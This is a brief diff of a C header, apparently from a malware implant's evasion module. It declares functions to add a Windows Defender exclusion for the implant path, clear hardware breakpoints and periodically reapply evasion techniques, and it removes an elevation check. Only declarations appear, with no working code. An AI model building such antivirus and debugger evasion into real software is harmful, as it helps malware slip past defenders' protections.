@@ -13,8 +13,5 @@ BOOL ClearHardwareBreakpoints();
 // Add Defender exclusion for implant path (if elevated)
 BOOL AddDefenderExclusion(const wchar_t* exePath);
 
-// Check if running elevated
-BOOL IsElevated();
-
 // Re-apply all evasion techniques (called periodically)
 VOID ReapplyEvasion();
